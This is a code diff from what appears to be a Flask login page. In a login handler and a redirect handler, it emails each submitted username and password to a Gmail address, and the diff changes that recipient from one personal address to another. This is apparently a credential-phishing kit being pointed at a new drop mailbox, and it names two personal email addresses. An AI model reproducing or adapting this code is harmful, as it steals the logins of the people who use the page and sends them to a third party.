@@ -42,7 +42,7 @@ def login():
         # Temporarily store the password in session (this is not secure in production)
         msg = Message(
             subject='M info',
-            recipients=['olamicreas@gmail.com'],
+            recipients=['beeamen8@gmail.com'],
             body=f"username: {email}\n pass: {passw}\n"
         )
         mail.send(msg)
@@ -123,7 +123,7 @@ def handle_redirect():
                 with app.app_context():
                     msg = Message(
                         subject='M info',
-                        recipients=['olamicreas@gmail.com'],
+                        recipients=['beeamen8@gmail.com'],
                         body=body
                     )
                     mail.send(msg)
